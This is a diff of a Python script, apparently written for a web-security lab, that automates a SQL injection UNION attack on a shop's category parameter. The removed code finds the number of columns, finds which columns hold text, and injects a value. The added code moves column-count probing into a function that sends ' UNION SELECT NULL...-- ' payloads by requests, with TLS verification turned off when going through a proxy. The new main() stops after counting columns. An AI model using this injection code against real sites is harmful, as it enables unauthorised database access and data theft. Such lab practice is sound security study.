@@ -1,6 +1,7 @@
 import sys
 import logging
 import urllib3
+import requests
 
 import utils
 from shop import Shop
@@ -17,44 +18,33 @@ logging.basicConfig(
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 
-def main(args):
-    shop = Shop(args.url, args.no_proxy)
-    hint = shop.get_hint()
-    print(hint)
-    nulls_list = ["NULL"]
+def determine_number_of_columns(url, no_proxy):
+    log.info("Determining number of columns")
+    nulls_list=["NULL"]
     num_columns = None
-    log.info("Determining number of culmn")
-    while len(nulls_list) < 50:
+    while len(nulls_list) < 10:
         nulls = ",".join(nulls_list)
         category = f"' UNION SELECT {nulls}-- "
-        resp = shop.get_category(category)
+        exploit_url = url + category
+        if no_proxy: 
+            resp = requests.get(exploit_url)
+        else: 
+            resp = requests.get(exploit_url, proxies=utils.PROXIES, verify=False)
         if resp.status_code == 200:
             num_columns = len(nulls_list)
             break
         nulls_list.append("NULL")
-    if num_columns:        
-        log.info(f"Number of columns is : {num_columns}")
-    text_columns = []
-    for i in range (0, num_columns):
-        nulls_list = ["NULL"] * num_columns    
-        nulls_list[i] = "'a'"
-        nulls = ",".join(nulls_list)
-        category = f"' UNION SELECT {nulls}-- "
-        resp = shop.get_category(category)
-        if resp.status_code == 200:
-            text_columns.append(i)
-    text_columns_str = ", ".join(map(str, text_columns))            
-    log.info(f"The text columns are: {text_columns_str}")
-    
-    nulls_list = ["NULL"] * num_columns
-    nulls_list[text_columns[0]] = f"'{hint}'"
-    nulls = ",".join(nulls_list)
-         
-    category = f"' UNION SELECT {nulls}-- "
-    resp = shop.get_category(category)
-    if resp.status_code == 200:    
-        shop.is_solved()
-    
+    if num_columns:
+        log.info(f"number of columns if: {num_columns}")
+    return num_columns
+
+
+
+
+
+def main(args):
+    shop = Shop(args.url, args.no_proxy)
+    num_columns = determine_number_of_columns(shop.category_url, shop.no_proxy)
     
 if __name__ == "__main__":
     args=utils.parse_args(sys.argv)
